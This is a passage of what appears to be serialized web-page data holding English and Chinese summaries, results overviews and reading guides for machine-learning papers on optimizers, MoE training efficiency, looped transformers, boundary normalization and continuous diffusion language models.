The most useful ablations are likely: fixed sparsity ratio versus gradient-mass budget, deterministic dropping versus importance-sampled unbiased estimation, gains as sequence length grows, and whether variable-length support preserves wall-clock benefits. For this paper, those ablations matter more than downstream benchmark breadth because the core contribution is a training-efficiency mechanism.2f:T45e,The analysis starts with an isotropic Gaussian noise baseline. In the fixed-dimensional low-SNR limit, applying the partial polar map to each stochastic gradient gives a conditional mean response that is, to first order, only a scalar multiple of the population gradient. The paper then studies associative memory with heterogeneous task frequencies. A key mechanism is nullspace preservation: if a task direction is absent from a mini-batch, Muon does not update that direction. For two tasks, the paper derives an exact balancing threshold; for rare tasks, B_bal scales as roughly (log 2) / p_min. For higher-rank task hierarchies, local perturbation estimates identify B p_j as the controlling scale. The label-noise analysis separates task counts B p_j from corruption counts B p_j rho_alpha, and an isotropic covariance closure predicts a Muon contraction coefficient scaling like sqrt(Bp), while SGD scales linearly with the local frequency p. The paper also contrasts Muon with SignSGD as a proxy for coordinatewise adaptivity, emphasizing that Muon is orthogonally equivariant while SignSGD is basis dependent.30:T42e,The benchmark is MLPerf Small MoE Training with GPT-OSS-20B. Training uses C4 pre-tokenized with the Llama-3.1 tokenizer, roughly 80GB after preprocessing. The global batch size is 16. Validation is run every 12,288 samples, or 768 iterations, on the first 1,024 validation samples. The target is validation loss at or below 3.34. The evaluation has two layers. At the operator level, synthetic tensors include heavy-tailed perturbations: each element has a 0.5% chance of receiving an outlier of roughly 100 standard deviations. The metric is SNR against a BF16 reference for forward outputs, input gradients, and weight gradients. At the training level, the paper reports validation loss and steps to reach the MLPerf target. These curricula target different kinds of structure: hierarchical dependency tracking, latent transition rules and long-range interactions, reference-like declarative structure, and programmatic regularities. The experiments separate additive-compute from compute-matched training. In the additive setting, PPT is prepended before a fixed natural-language training budget. In the compute-matched setting, PPT replaces part of the natural-language training budget. The authors test data-constrained, data-unconstrained, and high token-to-parameter-ratio regimes. The setup includes 336M-parameter models and a larger 881M-parameter run trained on 50B tokens. Natural-language budgets include 50M, 100M, and 1B tokens, while PPT tokens are swept from 5M to 1B. A key design choice is explicit tuning over initialization schemes. In an NCA reproduction, the previously reported benefit appears under the original token-embedding initialization, but disappears when the embedding initialization is changed from N(0,1) to N(0,0.02). The paper also probes mechanism by tracking performance on the PPT distributions after switching to natural language, and by comparing front-loaded PPT with uniform interleaving.32:T469,The main results are consistent across regimes. First, the NCA positive-control reproduction recovers a 5.4% perplexity improvement from PPT under the original setup, but the advantage closes after changing the token embedding initialization to N(0,0.02). Second, in the additive-compute setting, tuned k-Dyck and NCA can improve over the best no-PPT baseline at 50M and 100M natural-language tokens, but the advantage vanishes by 1B tokens. Third, under compute matching, natural-language training performs as well as or better than every PPT curriculum. This includes the strongest scarcity case: multiple epochs over a 100M-token natural-language corpus beat synthetic PPT. Fourth, downstream results on DCLM CORE and BLiMP do not show a stable accuracy advantage for PPT, with exceptions limited to the smallest compute budgets. The mechanism experiments show that gains on the PPT distribution tend to disappear after the transition into natural-language training. Uniform interleaving preserves more of the synthetic-distribution behavior, but does not produce a significant improvement in natural-language validation loss.33:T6cd,The model is a Parcae-style looped Transformer. Inputs pass through a Prelude, then the same Core blocks are applied recurrently multiple times, with the input representation injected at every iteration, and a Coda plus LM head produces next-token logits. During training, each sequence samples a forward depth T_i from max(1, Poisson(16)); evaluation mainly uses T_eval = 16. The control variable is the backward window k: gradients are retained only through the final min(k, T_i) iterations, while earlier iterations are executed in the forward pass and detached at the boundary. This keeps the forward computation and inference architecture fixed, changing only gradient depth and per-update training cost.

The main contribution is the experimental protocol rather than a new model. At each budget, the authors run two paired comparisons. Equal-token comparisons train different windows on the same amount of data, isolating per-token efficiency. Matched-time comparisons allocate approximately the same training time to each window, allowing the shorter window to take more updates because each update is cheaper. Paired runs share random seeds, and the forward-depth distribution, architecture, and inference iteration count are held fixed. This lets the paper separate the benefit of deeper backprop itself from the benefit of simply training longer.

The primary comparison is K4 versus K8, with additional K6 and FULL controls. An important detail is that “extended training” means a full recipe adjusted to the larger update count, including a rescaled learning-rate schedule, not just naively appending extra steps. That matters because in realistic pretraining, the value of extra updates depends strongly on schedule design.34:T650,There are two model scales. The main configuration has about 144M parameters with width 768 and a 2/2/2 Prelude/Core/Coda layout. A larger configuration has about 388M parameters, width 1024, and 4/4/4 blocks. Training uses a document-deduplicated FineWeb-Edu subset, sequence length 1024, and the main metric is test NLL, with downstream checks on CORE (22 tasks) and LAMBADA.

Four findings matter most. First, at the smaller training budget, K4 beats K8 in matched-time comparisons across all seeds: shallower backprop plus more updates is the better use of limited time. Second, when the budget is increased by 4x, the K4 advantage shrinks on every seed evaluated at both budgets. The paper presents this as a robust trend, not a one-off fluctuation, and reports the same direction under different learning rates and model configurations. Third, equal-token controls confirm that K8 is genuinely more efficient per token: if token count is fixed, deeper backprop learns more from the same data. Fourth, the shift in matched-time preference comes from both components getting smaller with scale, but extended-training gains shrink more than per-token-efficiency gains. In other words, as budget grows, “doing more updates” becomes less valuable faster than “learning more from each token,” making longer windows relatively more competitive.

The abstract excerpt does not expose the full numeric tables, but the body supports a clear conclusion: the best backward window is not budget-invariant. Choosing a recipe from a single-budget or fixed-token comparison can be misleading for larger-scale training.35:T48a,LRMoE uses a two-phase design. During the forward pass, it preserves all routed computations. After gating reveals the actual routed load, a controller plans retention quotas and expert placement under memory and communication constraints. During backpropagation, once incoming gradients arrive at the MoE layer, the system computes a Load Recalibration Metric for each token-expert pair. For a protected expert projection, the pairwise weight-gradient contribution is the outer product of the weighted incoming gradient and the saved projection input. LRM uses the squared norm of this contribution as a ranking score, without materializing a full per-pair gradient matrix. Within each expert quota, LRMoE keeps the highest-scoring pairs. A capacity-aware routing algorithm then assigns retained pairs to eligible expert instances. Physical compaction groups gradients and saved activations by destination and expert into dense payloads, reducing backward all-to-all traffic. Variable-size grouped GEMMs execute the retained rows without padding to the largest expert load, and an inverse mapping restores gradients to the layout expected by surrounding layers.36:T592,Cola2 uses a two-level hierarchy. The upper level dynamically segments text into semantic spans and compresses each span into continuous latents. The lower level uses a block-causal masked diffusion decoder to realize text. There are four key mechanisms. First, semantic segmentation is dynamic rather than fixed-size chunking, so the latent sequence can be shortened while better tracking semantic boundaries. Second, the compression rate is controlled by an auxiliary-loss-free negative-feedback mechanism, reducing dependence on manually tuned loss weights. Third, representation learning combines reconstruction and generation supervision: reconstruction encourages recoverable span-level information, while generation supervision makes the latents predictive beyond local copying. Fourth, representation learning is decoupled from prior fitting. The token-prediction loss is backpropagated through the latents into the encoder, allowing the encoder and decoder to co-adapt. The Diffusion Transformer prior learns the current latent distribution with Flow Matching, but its gradients do not update the encoder. At inference time, generated text is re-encoded block by block under a fixed span layout, keeping latent history aligned with the actual text context. Classifier-free guidance controls the strength of latent conditioning, giving a runtime knob between semantic adherence and autonomous context-based generation.37:T414,The paper reports two main experimental tracks. The first is a controlled five-task scaling study up to roughly 210B tokens, used to test the scaling behavior of the core design. The results are described as competitive and not saturated, suggesting that the hierarchical latent bottleneck does not immediately limit performance at this scale. The second is a separate pretraining run on 346.03B source tokens. It reaches a 60.10 average over eight tasks and outperforms Llama-3-8B on HellaSwag and StoryCloze while using over 43 times fewer reported tokens. This comparison should be read carefully because data mixture, training recipe, and evaluation setup matter, but it indicates that the hierarchical framework can preserve strong decoder capability on commonsense completion and narrative coherence tasks. The most important ablations are likely those on dynamic compression, the reconstruction-generation balance, clean/noisy/dropped latent conditioning, CFG strength, and gradient decoupling between prior fitting and encoder learning.38:Tb07,方法上分成两半。第一半在已发布的大模型权重上做“精确重排”实验。作者先对 Huginn-3.5B、Ouro-1.4B、Ouro-2.6B 做 topology audit：给所有 normalization module 打桩，统计不同 loop count 下每个模块的调用次数，以此判断某个 norm 是在 loop 内部每步调用，还是只在 readout 路径上调用。审计结果显示，Ouro 的 model-level normalization 每个 loop step 都会调用，等价于存在 loop-boundary normalization；Huginn 则只在最终 readout 前调用。随后作者对 Ouro 做一个非常克制的改动：把这个 model-level norm 限制到最后一个 loop step 才执行。这样 readout path 保持 bit-identical，参数不变，而且在 r=1 时该改动严格是恒等映射，可作为实现正确性的检查。这个设计很重要，因为它把变化限制在“重新进入下一轮 loop 的状态”上，尽量排除了别的混杂因素。

第二半是因果实验：从头训练小规模 looped 模型，把是否使用 boundary normalization 作为训练前就固定的拓扑开关。模型规模从 19M/6 层到 76M/24 层，两个任务家族，normalization 轴上每个配置 16 个独立 seed，总计 50 个模型。统计上以 training seed 为分析单位，使用精确 rank test 和 Cliff’s delta，而不是只报单次曲线。这个设计回答的是：如果训练和推理始终一致，那么 boundary normalization 到底有没有帮助。

机制分析上，作者没有停在 accuracy，而是同时跟踪四类信号：每个 loop step 的 state norm、readout entropy、logit margin、输入到预测的 mutual information。结果显示，去掉已训练模型中的 boundary norm 后，性能会在少数 loop step 内崩掉，但 state norm 只变化到最多 2.021 倍，远不到“尺度发散”能解释的程度；相反，readout entropy 会从 0.786 bits 飙到 12.470 bits，随后又回落，因为输出头开始把概率质量压到答案字母表之外，最后甚至塌成单一 token。作者进一步做了一个很有说服力的诊断：冻结 loop 主体后只重拟合 readout，损失只能恢复到约三分之一；若连最后一个 block layer 一起重拟合，则几乎能把损失全部找回。这说明问题不只是最后线性头的校准，而是 loop 末端表示与读出接口一起发生了错位。

论文还有一个方法学点：比较 loop depth 和 stack depth 时，若按绝对 K 比，会系统性偏向训练 loop count 更大的配置，因为它虽然看起来“更深”，但推理 compute 其实不等价。作者主张按 budget overshoot K/r0 比较，这同时也是等 compute 的比较方式。在这个口径下，looping 相对 stacking 的优势在 circuit 任务上检测不到，在 hops 任务上也会缩小而不是扩大。39:Tb48,The study has two complementary halves. The first uses released large-model checkpoints and performs an exact topology intervention without retraining. The authors instrument every normalization module in Huginn-3.5B, Ouro-1.4B, and Ouro-2.6B, counting calls under different loop counts to determine whether a given normalization acts inside the loop or only on the readout path. This audit shows that Ouro applies its model-level normalization once per loop step, creating a loop-boundary normalization, while Huginn applies the corresponding module only once before readout.

They then modify Ouro in a tightly controlled way: the model-level normalization is restricted to the final loop step only. This keeps the readout path bit-identical, adds no parameters, and is exactly the identity when r=1, which serves as an implementation check. That intervention isolates the effect on the state that re-enters the next loop iteration while minimizing confounds.

The second half is causal: small looped models are trained from scratch with the topology fixed in advance, with and without boundary normalization. The models range from 19M parameters at 6 layers to 76M at 24 layers, across two task families, with 16 independent seeds per configuration on the normalization axis and 50 models overall. The unit of analysis is the training seed, and the paper uses exact rank tests and Cliff’s delta rather than relying on single runs.

Mechanistically, the paper goes beyond accuracy and tracks four signals: per-step state norm, readout entropy, logit margin, and input-to-prediction mutual information. This is where the argument becomes convincing. Removing boundary normalization from a model trained with it causes rapid collapse within a few loop steps, but state norm changes by at most 2.021x across the grid, which is far too small to support a residual-growth explanation. In contrast, readout entropy jumps from 0.786 to 12.470 bits on a one-bit task, then falls again as the head collapses onto tokens outside the answer alphabet. A further diagnostic strengthens the interpretation: refitting only the readout on top of a frozen damaged loop recovers only about one third of the loss, whereas refitting the last block layer together with the readout recovers essentially all of it. That localizes the failure to a mismatch at the loop-end representation/readout interface, not to generic numerical instability.

The paper also makes a methodological point about comparing loop depth to stack depth. Comparing at equal absolute K systematically favors the configuration with larger trained loop count r0, even though compute is not matched. The authors argue that equal budget overshoot K/r0 is the fair comparison because it also equalizes compute. Under that comparison, the apparent advantage of looping over stacking disappears on circuit tasks and shrinks on hops tasks.3a:T693,On released checkpoints, removing loop-boundary normalization from Ouro-1.4B and Ouro-2.6B causes severe failure near or before the trained loop budget. On a balanced binary task, accuracy can collapse to chance (0.500) by the trained budget. The important negative result is that this collapse does not come with large state-scale blow-up: the state norm changes by at most a factor of 2.021 over the full grid. The stronger signal is in the readout: entropy rises from 0.786 to 12.470 bits and later falls as the model commits to tokens outside the answer alphabet, indicating readout miscalibration rather than unstable recurrence. Logit margin and mutual-information measurements support the same story.

The from-scratch experiments are the causal core. Across two task families, training without boundary normalization is never worse than training with it when each model is evaluated under its own matched topology, and it is better at every depth except the trained one. Models trained with boundary normalization peak sharply at K=r0 and degrade on both sides, showing depth overfitting. Models trained without it have flatter and more reusable depth profiles. Because the conclusion is based on 16 seeds per configuration and rank-based statistics, it is much stronger than a typical single-seed ablation.

A particularly informative experiment is the readout-refit test. For a model damaged by topology mismatch, refitting only the output head recovers roughly one third of the loss, while refitting the last block layer together with the head recovers nearly all of it. That pins the failure on the late representation/readout interface rather than on global instability.3b:T6d7,Start with the Introduction and the setup around the two competing hypotheses: “boundary normalization is required” versus “training and inference topologies must agree.” That distinction is the backbone of the paper.

Then read the topology-audit section carefully. The instrumentation logic is simple but important: counting normalization calls under different loop counts lets the authors infer where normalization actually sits in the computation graph. The exact rearrangement on Ouro is worth understanding in detail because the control is unusually clean: bit-identical readout path, no added parameters, and an identity check at r=1.

Sections 4.1 and 4.2 deserve close reading for the mechanism. Focus on how state norm, readout entropy, logit margin, and mutual information jointly rule out the residual-growth explanation. The entropy trajectory is especially informative because it shows the head first becoming uncertain and then collapsing onto the wrong token set.

Sections 4.3 and 4.4 are the main causal evidence. Pay attention to why the authors train from scratch with topology fixed beforehand, why they use 16 seeds, and how the depth-generalization curves differ with and without boundary normalization. Those sections carry the practical recipe implication.

Section 4.5 is also worth reading if you care about fair comparisons between looped and stacked depth. The distinction between equal absolute K and equal K/r0 is easy to miss and can materially change conclusions.

If reading time is limited, the best order is: Introduction → topology audit and exact intervention → from-scratch causal results → readout-refit diagnosis → depth-comparison methodology. A careful read should take about 60–90 minutes.3c:Tb5f,技术方案可以分成四部分看。

第一部分是理论分析。作者先分析中间状态 s = αe_i + βz 的解码竞争关系。若用欧氏距离，候选 token 的得分会分解成一个随信号缩小而衰减的对齐项，以及一个与当前状态无关的静态范数项。问题就在这里：当 α 变小，即便 β=0、状态方向仍完全对准源 token，低范数 token 也可能因为静态范数优势而“反超”。这不是语义替换，而是度量退化。于是作者转到方向空间，用 cosine / directional ranking 来定义竞争，得到 pairwise crossing 的阈值条件：候选是否超过源 token，取决于有效噪声是否大于两者的语义分离。这个阈值理论把 token identity metric 从经验统计量还原成了大量 pairwise crossing 的聚合结果。

第二部分是 noising geometry。既然问题来自 norm decay，作者就不再沿普通连续高斯轨迹做 corruption，而是设计了 spherical noising。做法是把状态看成沿球面 geodesic 向一个 mask-biased endpoint 插值。这样可以尽量保持向量范数稳定，把竞争关系限制在方向空间里发生，避免欧氏几何下的伪竞争。这里的关键不是“球面”这个词本身，而是它服务于一个更明确的目标：让 corruption 过程和 token competition 的真实判据一致。

第三部分是时间调度，也就是 Semantic Retention Scheduling。Competition Threshold Theory 说明，大量 identity crossing 只会在接近高噪声端才发生。若仍用常规时间参数化，训练的大部分步数都浪费在身份几乎不变的区间，真正困难的身份转移区间反而预算很少。作者因此按 logarithmic rank decay 重新分配时间步，把更多 denoising budget 放到 identity 快速变化的区间。这不是简单的 loss-aware resampling，而是直接围绕 token rank / identity decay 设计 schedule。

第四部分是模型实例化，即 LLaCO。它基于预训练 backbone 适配到连续表示空间，包含 embedding directional adapter 和 timestep-conditioned modulation。前者负责把离散 token embedding 映射到适合方向竞争的连续空间，后者让 backbone 在不同噪声阶段采用不同调制。推理时，模型做 sequential blockwise denoising，并沿 spherical geodesic 逐步把连续语义轨迹翻译回离散 token。这里仍保留 blockwise 生成而不是一次性全序列并行，说明作者在生成质量与并行性之间做了折中：先把连续扩散的语义轨迹建稳，再逐步释放并行生成潜力。

和已有 continuous diffusion LM 相比，区别主要有三点：一是从经验 identity metric 转向解析阈值理论；二是从普通欧氏 corruption 转向方向一致的球面 noising；三是 schedule 不再围绕时间均匀性或损失均匀性，而是围绕语义身份保留来分配训练预算。3d:T8b3,全文给出的核心实验结论是：LLaCO 在大规模实例化下显著优于此前连续扩散基线，并且已经接近同规模离散扩散模型。模型规模方面，作者明确实例化了一个 8B 模型，这是这篇工作的一个重要信号，因为很多连续扩散 LM 论文停留在中小规模验证，难以判断方法是否能撑到真正的 LLM 区间。

从实验结构看，最值得注意的不是单个 benchmark 分数，而是理论—指标—系统三层验证是否闭合。第一类实验验证理论：作者比较欧氏解码与 cosine / directional ranking 下的 overtaking 行为，显示欧氏度量会在低噪声甚至零噪声附近产生虚假反超，而方向空间的 crossing 更符合实际 token identity 衰减。第二类实验验证 schedule：作者测量预训练 embedding 上的 identity metric / rank decay，发现经验曲线与理论推导的 crossing aggregation 基本一致，并且常规时间参数化确实把大量身份变化压缩在尾部；重新分配后，训练步数更集中在高信息密度区间。第三类实验验证系统收益：LLaCO 在广泛 benchmark 上全面超过先前 continuous diffusion baselines，并与可比规模的 discrete diffusion 模型接近或相当。

从消融角度，最该关注的应是四组：directional decoding vs Euclidean、spherical noising vs standard noising、semantic retention scheduling vs conventional schedule、adapter/modulation 组件是否必要。论文主张较强，若这些消融成立，说明收益不是单点技巧，而是几何、调度、架构适配共同作用的结果。

摘要和引言没有给出完整表格数字，因此无法在不臆测的前提下逐项复述 benchmark 分数。但可以确定的硬信息有两点：一是模型规模为 8B；二是作者强调“comprehensively outperforms previous continuous diffusion baselines and rivals discrete diffusion models of comparable scale”。阅读正文时应重点核对：提升是否稳定覆盖语言建模、通用生成和采样效率相关指标；以及在相同采样步数、相同 backbone、相同 tokenizer 条件下，LLaCO 的增益有多少来自 schedule，多少来自 spherical noising。3e:T978,The method has four tightly linked components.

First, the theory. For an intermediate state s = αe_i + βz, Euclidean decoding can be decomposed into an alignment term that shrinks with the signal and a static norm penalty that does not depend on the current state. This asymmetry creates a degeneracy: as α decreases, a lower-norm token may overtake the source even at zero noise. That is not semantic replacement; it is a metric artifact. The paper therefore switches to directional competition, effectively a cosine-based ranking view, and derives pairwise crossing thresholds. A candidate overtakes the source only when the effective directional noise exceeds their semantic separation. Existing token identity metrics are then reinterpreted as statistical aggregates of many such pairwise crossings.

Second, the noising geometry. Since the pathology comes from norm decay, the paper replaces standard continuous corruption with spherical noising. The trajectory is formulated as a geodesic interpolation toward a mask-biased endpoint, so vector norms are preserved more faithfully and competition happens in directional space rather than being distorted by Euclidean norm effects. This is an important design choice: the corruption process is made consistent with the competition criterion.

Third, the schedule. Competition Threshold Theory implies that in high dimensions, most meaningful identity transitions happen only at very high noise levels. A standard time parameterization therefore wastes much of training on regions where token identity barely changes, while under-allocating budget to the narrow transition zone. The proposed Semantic Retention Scheduling reallocates timesteps according to logarithmic rank decay, explicitly concentrating optimization where identity transitions occur.

Fourth, the model instantiation, LLaCO. A pretrained backbone is adapted to continuous representations using an embedding directional adapter and timestep-conditioned modulation. At inference time, generation proceeds through sequential blockwise denoising along spherical geodesics, translating continuous semantic trajectories back into discrete tokens. Compared with earlier continuous diffusion LMs, the novelty is not just a new schedule. It is the combination of a directional theory of token competition, a norm-preserving corruption path, and a schedule aligned to semantic retention rather than raw time.3f:T869,The main empirical message is that LLaCO scales beyond toy settings and performs substantially better than prior continuous diffusion baselines, while becoming competitive with discrete diffusion models at similar scale. The instantiated model is 8B, which is itself notable because many continuous diffusion LM papers stop at much smaller scales.

The most useful way to read the experiments is as a three-level validation stack. First, theory validation: the paper compares Euclidean decoding with directional ranking and shows that Euclidean distance produces premature overtaking, including near-zero-noise artifacts, whereas directional competition better matches actual identity decay. Second, schedule validation: empirical identity metrics and rank decay measured on pretrained embeddings track the theoretical crossing behavior, and standard trajectories indeed compress most identity transitions near the noisy endpoint. Third, system validation: once spherical noising and semantic-retention scheduling are built into the model, LLaCO consistently beats earlier continuous diffusion baselines across a broad benchmark suite and approaches discrete diffusion performance.

The most important ablations are likely the following: Euclidean vs directional decoding, standard vs spherical noising, conventional vs semantic-retention scheduling, and the contribution of the directional adapter plus timestep modulation. If these ablations are strong, the gains are not a fragile artifact of one engineering trick but the result of aligning geometry, scheduling, and model adaptation.

The hard facts available are that the model size is 8B and that the paper claims comprehensive gains over prior continuous diffusion baselines while rivaling comparable discrete diffusion models. When reading the full paper, the key numbers to verify are: how stable the gains are across tasks, whether comparisons are controlled for backbone and sampling budget, and how much of the improvement comes from scheduling versus the spherical corruption path.40:T639,Start with Section 3.1. That is the intellectual center of the paper. The critical question is whether the derivation really justifies the claim that Euclidean overtaking is often spurious because of the static norm term. If that argument holds, the rest of the design follows naturally.

Then read Sections 3.2 and 3.3 together. Section 3.2 explains why temporal compression is structural rather than incidental.
